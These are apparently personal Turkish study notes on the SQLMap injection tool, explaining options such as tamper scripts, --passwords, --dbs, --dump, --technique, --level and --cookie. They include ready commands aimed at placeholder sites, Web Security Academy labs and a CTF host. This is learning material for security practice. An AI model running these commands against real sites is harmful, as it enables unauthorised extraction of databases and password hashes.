[[SQLMap]]

https://github.com/sqlmapproject/sqlmap/wiki/usage
--tamper  :
--
tamper scriptleri var girdiyi ona göre değiştirip o taktiği uyguluyor mesela base64encode.py base64 leyip gönderiyor 
diğer tamperlar : https://github.com/sqlmapproject/sqlmap/tree/master/tamper

```bash title:"tamper key"
python sqlmap.py --tamper=base64encode
```

--passwords : 
--
Hashlenmiş veya düz text olarak saklanmış şifreleri almak için

```bash title:'--passwords kullanımı'
sqlmap -u "http://hedef-site.com/vulnerable_page?id=1" --passwords
```

--columns :
--
Belirili bir tablo için o tabloya ait verileri listeler 

```bash title:'belirli bir tablo'
sqlmap -u "http://hedef-site.com/vulnerable_page?id=1" --columns -D veritabani_adi -T tablo_adi
```
**`-D`**: Veritabanı adı
**`-T`**: Tablo adı

--dbs :
--
database bilgilerini almak için kullanılır 

```bash
sqlmap -u "http://hedef-site.com/vulnerable_page?id=1" --dbs
```

--dump : 
--
database belirtilen içerikleri getirir belirtmediysen hepsini

```bash 
python sqlmap.py -u "https://0a4300e404ee84788730f4f600c70072.web-security-academy.net/filter?category=Gifts" --technique=U -D public -T users_ybkirg  --dump -v 3
```

--technique (BEUSTQ):  
--
**--technique=U**
- `B`: Boolean-based blind
- `E`: Error-based
- `U`: Union query-based
- `S`: Stacked queries
- `T`: Time-based blind
- `Q`: Inline queries

--level (1-5): 
--
HTTP cookie testleri 2. seviyeden sonra 
HTTP user-agent/Referrer headers testleri 3. seviyeden sonra 

| Level         | Desc.                                                                                     |
| ------------- | ----------------------------------------------------------------------------------------- |
| `1` (default) | A limited number of tests/requests: `GET` and `POST` parameters will be tested by default |
| `2`           | Test cookies (HTTP cookie header values)                                                  |
| `3`           | Test cookies plus HTTP `User-Agent/Referer` headers’ values                               |
| `4`           | As above, plus null values in parameters and other bugs                                   |
| `5`           | An extensive list of tests with an input file for payloads and boundaries                 |

--tables :
--
database deki tabloları enumerate etmeye yarar 


--cookie :
--
cookielerin kullanılmasını istiyorsan belirtebilirsin 
level düzeyinin 2 den fazla olması lazım cookielerin kullanılması için 
```bash
python sqlmap.py -u "https://0a2d003a03431aac84a428cc00540064.web-security-academy.net" --cookie "TrackingId=asdasd" --dbs --level 2
```

--second-url : 
--
URL'e uygulandıktan sonra ziyaret edilmesi gereken URL i belirtir 

```bash
sqlmap --tamper tamper/so-tamper.py 
--url http://10.10.1.134:5000/challenge4/signup 
--data "username=admin&password=asd" 
--second-url http://10.10.1.134:5000/challenge4/notes -p username 
--dbms=sqlite 
--technique=U 
--no-cast -T users --dump
```
